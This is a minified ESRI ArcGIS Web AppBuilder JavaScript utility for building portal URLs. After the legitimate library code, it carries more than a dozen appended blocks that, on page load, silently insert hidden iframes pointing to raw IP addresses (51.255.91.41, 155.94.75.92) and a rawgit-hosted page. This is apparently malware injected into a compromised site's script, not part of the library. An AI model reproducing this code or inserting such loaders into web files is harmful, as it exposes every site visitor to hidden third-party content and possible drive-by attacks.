// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define(function(){var c={declaredClass:"jimu.shared.basePortalUrlUtils"};"function"!==typeof String.prototype.trim&&(String.prototype.trim=function(){return this.replace(/^\s*/gi,"").replace(/\s*$/gi,"")});"function"!==typeof String.prototype.startWith&&(String.prototype.startWith=function(a){return this.substr(0,a.length)===a});"function"!==typeof String.prototype.endWith&&(String.prototype.endWith=function(a){return this.substr(this.length-a.length,a.length)===a});c.getServerByUrl=function(a){a=
(a||"").trim();a=a.replace(/^(http(s?):?)\/\//gi,"");0===a.indexOf("//")&&(a=a.slice(2));return a.split("/")[0]};c.getServerWithProtocol=function(a){var b="";if(a=(a||"").trim()){var d=c.getServerByUrl(a);if(!d)return b;var e=c.getProtocol(a);e?b=e+"://"+d:0===a.indexOf("//")&&(b="//"+d)}return b};c.isSameServer=function(a,b){a=c.getServerByUrl(a)||"";b=c.getServerByUrl(b)||"";return a.toLowerCase()===b.toLowerCase()};c.getDomain=function(a){var b="";if(a=c.getServerByUrl(a))a=a.replace(/:\d+$/,""),
a=a.match(/[^.]\w+\.\w+$/),null!==a&&(b=a[0],/^\d+\.\d+$/.test(b)&&(b=""));return b};c.isSameDomain=function(a,b){a=c.getDomain(a);b=c.getDomain(b);return""!==a&&a===b};c.isOrgOnline=function(a){return 0<=c.getServerByUrl(a).toLowerCase().indexOf(".maps.arcgis.com")};c.isOnline=function(a){return 0<=c.getServerByUrl(a).toLowerCase().indexOf(".arcgis.com")};c.isArcGIScom=function(a){a=c.getServerByUrl(a).toLowerCase();return"www.arcgis.com"===a||"arcgis.com"===a};c.getStandardPortalUrl=function(a){var b=
c.getServerByUrl(a);if(""===b)return"";c.isOnline(b)?(c.isArcGIScom(b)&&(b="www.arcgis.com"),a=c.addProtocol(a),a=c.getProtocol(a)+"://"+b):(a=(a||"").trim().replace(/sharing(.*)/gi,"").replace(/\/*$/g,""),a=c.addProtocol(a),a.replace(new RegExp("http(s?)://"+b,"g"),"")||(a+="/arcgis"));return a};c.isSamePortalUrl=function(a,b){var d=/^http(s?):\/\//gi,e=/^\/\//gi;a=c.getStandardPortalUrl(a).toLowerCase().replace(d,"").replace(e,"");b=c.getStandardPortalUrl(b).toLowerCase().replace(d,"").replace(e,
"");return a===b};c.addProtocol=function(a){if(-1>=a.toLowerCase().indexOf("http://")&&-1>=a.toLowerCase().indexOf("https://")){var b="";"undefined"!==typeof window&&window.location?(b=window.location.protocol,a=a.startWith("//")?b+a:a.startWith("/")?b+"//"+window.location.host+a:b+"//"+a):(b="http:",a=a.startWith("//")?b+a:b+"//"+a)}return a};c.getProtocol=function(a){var b="";a=a.toLowerCase();0===a.indexOf("https://")?b="https":0===a.indexOf("http://")&&(b="http");return b};c.updateUrlProtocolByOtherUrl=
function(a,b){b=b.toLowerCase();0===b.indexOf("https://")?a=c.setHttpsProtocol(a):0===b.indexOf("http://")&&(a=c.setHttpProtocol(a));return a};c.removeProtocol=function(a){return a.replace(/^http(s?):\/\//i,"//")};c.setHttpProtocol=function(a){a=c.addProtocol(a);return a.replace(/^https:\/\//,"http://")};c.setHttpsProtocol=function(a){a=c.addProtocol(a);return a.replace(/^http:\/\//,"https://")};c.setProtocol=function(a,b){return 0<=b.indexOf("https")?c.setHttpsProtocol(a):0<=b.indexOf("http")?c.setHttpProtocol(a):
a};c.getSharingUrl=function(a){var b="";(a=c.getStandardPortalUrl(a))&&(b=a+"/sharing/rest");return b};c.getOAuth2Url=function(a){var b="";(a=c.getStandardPortalUrl(a))&&(b=a+"/sharing/rest/oauth2");return b};c.getAppIdUrl=function(a,b){var d="";(a=c.getStandardPortalUrl(a))&&(d=a+"/sharing/rest/oauth2/apps/"+b);return d};c.getSignInUrl=function(a){var b="";(a=c.getStandardPortalUrl(a))&&(b=a+"/home/signin.html");return b};c.getBaseSearchUrl=function(a){var b="";a=c.getStandardPortalUrl(a);(a=a.replace(/\/*$/g,
""))&&(b=a+"/sharing/rest/search");return b};c.getBaseItemUrl=function(a){var b="";(a=c.getStandardPortalUrl(a))&&(b=a+"/sharing/rest/content/items");return b};c.getItemUrl=function(a,b){var d="";(a=c.getBaseItemUrl(a))&&b&&(d=a+"/"+b);return d};c.getItemDataUrl=function(a,b){var d="";(a=c.getItemUrl(a,b))&&(d=a+"/data");return d};c.getItemGroupsUrl=function(a,b){var d="";(a=c.getItemUrl(a,b))&&(d=a+"/groups");return d};c.getGenerateTokenUrl=function(a){var b="";(a=c.getStandardPortalUrl(a))&&(b=
a+"/sharing/generateToken");return b};c.getItemDetailsPageUrl=function(a,b){var d="";a&&b&&(a=c.getStandardPortalUrl(a),d=a+"/home/item.html?id\x3d"+b);return d};c.getUserProfilePageUrl=function(a,b){var d="";a&&b&&(a=c.getStandardPortalUrl(a),d=a+"/home/user.html?user\x3d"+b);return d};c.getBaseGroupUrl=function(a){var b="";(a=c.getStandardPortalUrl(a))&&(b=a+"/sharing/rest/community/groups");return b};c.getPortalSelfInfoUrl=function(a){var b="";(a=c.getStandardPortalUrl(a||""))&&(b=a+"/sharing/rest/portals/self");
return b};c.getCommunitySelfUrl=function(a){var b="";(a=c.getStandardPortalUrl(a||""))&&(b=a+"/sharing/rest/community/self");return b};c.getBaseUserUrl=function(a){var b="";(a=c.getStandardPortalUrl(a))&&(b=a+"/sharing/rest/community/users");return b};c.getUserUrl=function(a,b){var d="",e=c.getBaseUserUrl(a);a&&b&&(d=e+"/"+b);return d};c.getUserTagsUrl=function(a,b){var d="",e=c.getUserUrl(a,b);a&&b&&(d=e+"/tags");return d};c.getUserThumbnailUrl=function(a,b,d){var e="";(a=c.getUserUrl(a,b))&&d&&
(e=a+"/info/"+d);return e};c.getContentUrl=function(a){var b="";a&&(a=c.getStandardPortalUrl(a),b=a+"/sharing/rest/content");return b};c.getUserContentUrl=function(a,b,d){var e="",e="";a&&b&&(e=c.getContentUrl(a),e=d?e+"/users/"+b+"/"+d:e+"/users/"+b);return e};c.getUserContentItemUrl=function(a,b,d){var e="",e="";a&&b&&d&&(e=c.getUserContentUrl(a,b),e=e+"/items/"+d);return e};c.getItemResourceUrl=function(a,b,d){var e="",e="";a&&b&&(e=c.getContentUrl(a),e=d?e+"/items/"+b+"/resources/"+d:e+"/items/"+
b+"/resources");return e};c.getAddItemUrl=function(a,b,d){var e="",e="";a&&b&&(e=c.getUserContentUrl(a,b,d),e+="/addItem");return e};c.getDeleteItemUrl=function(a,b,d){var e="";(a=c.getUserItemsUrl(a,b))&&(e=a+"/"+d+"/delete");return e};c.getUserItemsUrl=function(a,b,d){var e="",e="";a&&b&&(e=c.getUserContentUrl(a,b,d),e+="/items");return e};c.getUpdateItemUrl=function(a,b,d,e){var f="",f="";a&&b&&(f=c.getUserItemsUrl(a,b,e),f=f+"/"+d+"/update");return f};c.shareItemUrl=function(a,b,d,e){var f="",
f="";a&&b&&(f=c.getUserItemsUrl(a,b,e),f=f+"/"+d+"/share");return f};c.getHomeIndexUrl=function(a){var b="";(a=c.getStandardPortalUrl(a))&&(b=a+"/home/index.html");return b};c.getHomeMapViewerUrl=function(a,b){var d="";if(a=c.getStandardPortalUrl(a))d=a+"/home/webmap/viewer.html",d=b?d+("?webmap\x3d"+b):d+"?useExisting\x3d1";return d};c.getHomeSceneViewerUrl=function(a,b){var d="";if(a=c.getStandardPortalUrl(a))d=a+"/home/webscene/viewer.html",b&&(d+="?webscene\x3d"+b);return d};c.getHomeGalleryUrl=
function(a){var b="";(a=c.getStandardPortalUrl(a))&&(b=a+"/home/gallery.html");return b};c.getHomeGroupsUrl=function(a){var b="";(a=c.getStandardPortalUrl(a))&&(b=a+"/home/groups.html");return b};c.getHomeMyContentUrl=function(a){var b="";(a=c.getStandardPortalUrl(a))&&(b=a+"/home/content.html");return b};c.getHomeMyOrganizationUrl=function(a){var b="";(a=c.getStandardPortalUrl(a))&&(b=a+"/home/organization.html");return b};c.getHomeUserUrl=function(a){var b="";(a=c.getStandardPortalUrl(a))&&(b=a+
"/home/user.html");return b};c.getPortalHelpUrl=function(a,b){var d="";(a=c.getStandardPortalUrl(a))&&(d=a+"/portalhelp/"+(b||"en")+"/website/help/");return d};c.getPortalAdminHelpUrl=function(a,b){var d="";(a=c.getStandardPortalUrl(a))&&(d=a+"/portalhelp/"+(b||"en")+"/admin/help/");return d};c.getPortalProxyUrl=function(a){var b="";(a=c.getStandardPortalUrl(a))&&(b=a+"/sharing/proxy");return b};c.getOAuth2SignOutUrl=function(a){var b="";(a=c.getStandardPortalUrl(a))&&(b=a+"/sharing/rest/oauth2/signout");
return b};c.getNewPrintUrl=function(a){var b="";if(a=c.getStandardPortalUrl(a))a=c.setHttpProtocol(a),b=a+"/sharing/tools/newPrint";return b};c.getSwitchAccoutnsUrl=function(a,b,d){var e="";if(a=c.getStandardPortalUrl(a))e=a+"/home/pages/Account/manage_accounts.html#client_id\x3d"+b,d&&(e+="\x26redirect_uri\x3d"+d);e&&(e=c.setHttpsProtocol(e));return e};return c});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});